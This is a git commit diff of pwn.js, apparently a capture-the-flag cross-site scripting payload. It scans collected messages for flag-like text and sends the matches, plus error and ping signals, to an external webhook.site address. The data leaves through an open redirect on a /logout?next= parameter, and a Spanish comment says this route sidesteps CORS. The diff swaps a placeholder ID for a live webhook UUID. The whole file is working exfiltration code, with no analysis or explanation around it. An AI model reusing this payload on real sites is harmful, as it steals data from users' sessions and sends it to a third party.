9ecd5afa6f5dc0f0f29a7b27bdc66276ffa91b00
NULL <72146375+nulo-dev@users.noreply.github.com>
2025-10-03 16:53:27 +0200

    Update pwn.js

--- pwn.js
+++ pwn.js
@@ -4,8 +4,8 @@
   const hit=msgs.find(t=>/FLAG|CTF|{|}/i.test(t))||msgs.join('\n').slice(0,1500);
   // Exfiltra como PATH para no pelearte con CORS
   location.href=`/logout?next=https://webhook.site/9d777251-6207-4401-8b1e-a1fabe8c794e/${encodeURIComponent(hit)}`
-  location.href="/logout?next=https://webhook.site/TU-UUID/ping";
+  location.href="/logout?next=https://webhook.site/9d777251-6207-4401-8b1e-a1fabe8c794e/ping";
 }catch(e){
   location.href=`/logout?next=https://webhook.site/9d777251-6207-4401-8b1e-a1fabe8c794e/err_${encodeURIComponent(e.message)}`
-  location.href="/logout?next=https://webhook.site/TU-UUID/ping";
+  location.href="/logout?next=https://webhook.site/9d777251-6207-4401-8b1e-a1fabe8c794e/ping";
 }})();
